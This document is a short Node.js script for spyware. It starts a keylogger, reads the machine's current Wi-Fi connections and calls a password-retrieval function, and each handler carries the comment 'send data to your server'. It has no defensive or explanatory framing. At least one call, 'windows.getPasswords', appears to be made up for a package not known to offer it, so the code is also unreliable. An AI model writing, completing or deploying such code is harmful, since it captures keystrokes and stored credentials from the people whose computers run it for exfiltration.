const keylogger = require('node-keylogger');
const wifi = require('node-wifi');
const windows = require('node-windows');

keylogger.start();
wifi.init();
windows.init();

keylogger.on('data', (data) => {
  // send data to your server
});

wifi.getCurrentConnections((err, connections) => {
  // send data to your server
});

windows.getPasswords((err, passwords) => {
  // send data to your server
});
